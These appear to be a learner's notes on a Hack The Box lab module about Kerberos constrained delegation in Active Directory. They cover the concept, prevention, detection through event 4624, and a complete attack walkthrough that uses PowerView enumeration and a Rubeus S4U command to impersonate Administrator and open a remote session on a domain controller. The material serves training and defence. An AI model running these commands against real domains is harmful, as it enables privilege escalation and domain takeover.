# Kerberos Constrained Delegation

---

## Description

`Kerberos Delegation` enables an application to access resources hosted on a different server. For example, instead of granting the service account running a web server access to the database directly, we can allow the account to be delegated to the SQL server service. Once a user logs into the website, the web server service account requests access to the SQL server service on behalf of that user, allowing the user to access the content in the database that they are provisioned for without assigning access to the web server service account itself.

We can configure three types of delegation in Active Directory:

- `Unconstrained Delegation` (most permissive and broad)
- `Constrained Delegation`
- `Resource-based Delegation`

Knowing and understanding that any type of delegation is a possible security risk is crucial, and we should avoid it unless necessary.

As the name suggests, `Unconstrained Delegation` is the most permissive, allowing an account to delegate to any service. In `Constrained Delegation`, a user account has its properties configured to specify which service or services it may delegate to. For `Resource-based Delegation`, the configuration resides within the computer object being delegated to; in that case, the computer is configured as “I trust only this account or these accounts.” It is rare to see `Resource-based Delegation` configured by an administrator in production environments, but it is often abused by threat actors to compromise devices. However, `Unconstrained` and `Constrained Delegation` are commonly encountered in production environments.

---

## Attack

We will only showcase the abuse of `Constrained Delegation`. When an account is trusted for delegation, it sends a request to the KDC stating, “Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ,” and a Kerberos ticket is generated for user YYYY without supplying the password of user YYYY. It is also possible to delegate to another service even if it is not configured in the user properties. For example, if we are trusted to delegate for LDAP, we can perform protocol transition and be entrusted to any other service such as CIFS or HTTP.

To demonstrate the attack, we assume that the user `web_service` is trusted for delegation and has been compromised. The password of this account is `Slavi123`. To begin, we will use the `Get-NetUser` function from PowerView to enumerate user accounts that are trusted for constrained delegation in the domain:

> Note: Throughout the exercise, use the `PowerView-main.ps1` file in `C:\Users\bob\Downloads` when enumerating with the `-TrustedToAuth` parameter.

```powershell
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth

logoncount                    : 23
badpasswordtime               : 12/31/1601 4:00:00 PM
distinguishedname             : CN=web service,CN=Users,DC=eagle,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : web service
lastlogontimestamp            : 10/13/2022 2:12:22 PM
userprincipalname             : webservice@eagle.local
name                          : web service
objectsid                     : S-1-5-21-1518138621-4282902758-752445584-2110
samaccountname                : webservice
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 10/13/2022 9:53:09 PM
instancetype                  : 4
usncreated                    : 135866
objectguid                    : b89f0cea-4c1a-4e92-ac42-f70b5ec432ff
lastlogoff                    : 1/1/1600 12:00:00 AM
msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1,
                                http/DC1.eagle.local/EAGLE...}
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=eagle,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {cvs/dc1.eagle.local, cvs/dc1}
givenname                     : web service
lastlogon                     : 10/14/2022 2:31:39 PM
badpwdcount                   : 0
cn                            : web service
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/13/2022 8:32:35 PM
primarygroupid                : 513
pwdlastset                    : 10/13/2022 10:36:04 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 143463
```

![PowerShell command output showing 'Get-NetUser -TrustedToAuth' for 'web service' user, highlighting delegation to 'DC1' on HTTP service.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/Delegation.png)

We can see that the user `web_service` is configured for delegating the HTTP service to the Domain Controller `DC1`. The HTTP service provides the ability to execute PowerShell Remoting. Therefore, any threat actor who gains control of `web_service` can request a Kerberos ticket for any user in Active Directory and use it to connect to `DC1` over PowerShell Remoting.

Before we request a ticket with Rubeus (which expects a password hash instead of cleartext for the `/rc4` argument used later), we need to use it to convert the plaintext password `Slavi123` into its NTLM hash equivalent:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:Slavi123

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Calculate Password Hash(es)
[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

![Rubeus.exe command output showing password hash calculation for 'Slavi123', resulting in RC4_HMAC hash 'FCDC65703DD2B0D789977F1F3EEAECF'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/RubeusHash.png)

Then, we will use Rubeus to obtain a ticket for the `Administrator` account:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: S4U
[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFiDCCBYSgAwIBBaEDAgEWooIEnjCCBJphggSWMIIEkqADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtlYWdsZS5sb2NhbKOCBFgwggRUoAMCARKhAwIBAqKCBEYEggRCI1ghAg72
      moqMS1skuua6aCpknKibZJ6VEsXfyTZgO5IKRDnYHnTJT6hwywSoXpcxbFDDlakB56re10E6f6H9u5Aq
      ...
      ...
      ...
[+] Ticket successfully imported!
```

![Rubeus.exe command for S4U with TGT request successful, generating ticket for Administrator using RC4_HMAC hash.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/RubeusS4U.png)

To confirm that Rubeus injected the ticket into the current session, we can use the `klist` command:

```powershell
PS C:\Users\bob\Downloads> klist

Current LogonId is 0:0x88721

Cached Tickets: (1)

#0>     Client: Administrator @ EAGLE.LOCAL
        Server: http/dc1 @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 10/13/2022 14:56:07 (local)
        End Time:   10/14/2022 0:56:07 (local)
        Renew Time: 10/20/2022 14:56:07 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

![Klist command output showing cached ticket for Administrator at EAGLE.LOCAL with AES-256 encryption.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/klist.png)

With the ticket available, we can connect to the Domain Controller as the account `Administrator`:

```powershell
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami
EAGLE\administrator
[dc1]: PS C:\Users\Administrator\Documents>
```

![PowerShell session showing 'Enter-PSSession dc1', hostname 'DC1', and user 'eagle\administrator'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/Session.png)

If the last step fails, we may need to purge tickets, obtain new ones, and retry. We can also request tickets for multiple services with the `/altservice` argument, such as LDAP, CIFS, time, and host.

---

## Prevention

Fortunately, when designing Kerberos delegation, Microsoft implemented several protection mechanisms; however, they are not enabled by default for every user account. There are two direct ways to prevent a ticket from being issued for a user via delegation:

- Configure the property `Account is sensitive and cannot be delegated` for all privileged users.
- Add privileged users to the `Protected Users` group; this membership automatically applies the protection mentioned above. However, it is not recommended to use `Protected Users` without fully understanding its implications.

We should treat any account configured for delegation as extremely privileged, regardless of its actual privileges (such as being only a regular Domain user). Cryptographically secure passwords are a must, as we do not want Kerberoasting to give threat actors an account with delegation privileges.
---

## Detection

Correlating user behavior is the best technique to detect constrained delegation abuse. If we know the location and time a user regularly logs in, it becomes easy to alert on other suspicious behavior. For example, consider the account `Administrator` in the attack described above. If a mature organization uses `Privileged Access Workstations` (`PAWs`), they should alert on any privileged user not authenticating from those machines by monitoring event ID `4624` (successful logon).

On some occasions, a successful logon attempt with a delegated ticket will contain information about the ticket's issuer under the `Transited Services` attribute in the event log. This attribute is normally populated if the logon resulted from an `S4U` (Service For User) logon process.

`S4U` is a Microsoft extension to the Kerberos protocol that allows an application service to obtain a Kerberos service ticket on behalf of a user. If we recall from the attack flow when using Rubeus, we specified this S4U extension. Here is an example of a logon event generated by using the web service to request a ticket for the user `Administrator`, which was then used to connect to the Domain Controller in the same way as the attack path above:

![Event 4624 showing Administrator login from IP 172.16.18.25, with transited services as webservice@EAGLE.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A7/4624.png)

---

## Summary

This section explains `Kerberos Constrained Delegation`. It focuses on Description, Attack, Prevention, and Detection.

## What I Did

I reviewed the Hack The Box material, followed the examples, and reviewed the tools and steps shown in this section.

## What I Learned

I learned how constrained delegation can be abused to impersonate privileged users via S4U and how limiting delegation privileges and monitoring authentication behavior can reduce risk.


